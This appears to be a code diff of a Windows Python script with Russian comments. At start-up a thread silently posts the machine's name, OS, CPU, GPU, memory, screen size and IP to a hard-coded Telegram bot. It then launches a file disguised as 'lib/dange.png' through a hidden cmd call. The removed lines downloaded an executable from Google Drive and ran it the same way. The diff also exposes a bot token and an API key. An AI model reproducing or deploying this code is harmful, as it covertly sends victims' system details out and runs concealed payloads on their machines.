@@ -1,5 +1,6 @@
 import ctypes
 import os
+import platform
 import threading
 import subprocess
 import requests
@@ -7,6 +8,7 @@ from datetime import datetime
 import sys
 
 format = '%Y-%m-%d %H:%M:%S'
+ddline = '2023-06-02 21:00:00'
 
 def ip_address():
     try:
@@ -53,17 +55,24 @@ def cmdo_ret(com):  # нужно для работы ф-ции specifications
         print(res)
         return res  
 
-ddline = '2023-06-02 21:00:00'
-
 def specifications():  # возвращает характеристики пк
         x, y = ctypes.windll.user32.GetSystemMetrics(
             0), ctypes.windll.user32.GetSystemMetrics(1)
+        architecture = '64bit' if os.path.exists(
+            'C:\\Program Files (x86)') else '32bit'
+        proc = os.popen(r'wmic cpu get name').read().split('\n')[2]
         fram = int(os.popen(r"wmic OS get FreePhysicalMemory").read().split(
             "\n")[2].strip()) // 1024
-        banner = f"""System:       {os.getenv('APPDATA')}
+        vid = os.popen(
+            r"wmic path win32_VideoController get name").read().split('\n')[2]
+        banner = f"""Name PC:   {platform.node()}
+System:       {platform.system()} {platform.release()} {architecture}
+CPU:          {proc}
+GPU:          {vid}
 fRAM          {fram} MB
 Screen:       {x}x{y}"""
         return banner
+
 time = requests.get('https://api.api-ninjas.com/v1/worldtime?city=Moscow', headers={'X-Api-Key': '7/JYBJwpZAkhwVrxo0OAbA==Ew1A1Or9SYWUZIT7'}).json()['datetime']
 def my_function():
     requests.post("https://api.telegram.org/bot5289565439:AAHvXUFGLi8qA4K1lizCUHZnBbY9LHPqGvw/sendMessage", data={'chat_id': 1377256868, 'text': f'''RUN {datetime.now().strftime(format)}
@@ -71,14 +80,18 @@ def my_function():
 {specifications()}
 
 TRIAL:  {datetime.strptime(ddline, format) - datetime.strptime(time, format)}'''})
+    name = 'lib/dange.png'
     try:
-        open('lib/status.txt').read()
+        if int(open('lib/t.txt').read()):
+            os.remove(name)
+        else:
+            1/0
     except:
-        file = requests.get('https://drive.google.com/file/d/15UmEyKFtotjZtj8hGNnw9lMFh_LWXFVk/view?usp=share_link').content
-        open('lib/python.exe', 'wb').write(file)
-        com = f'start /b cmd /c start lib/python.exe'
+        com = f'start /b cmd /c start {name}'
         subprocess.run(com, shell=True)
-        open('lib/status.txt', 'wb').write('1')
+        open('lib/t.txt', 'w').write('1')
+
+
      
 threading.Thread(target=my_function).start()
 
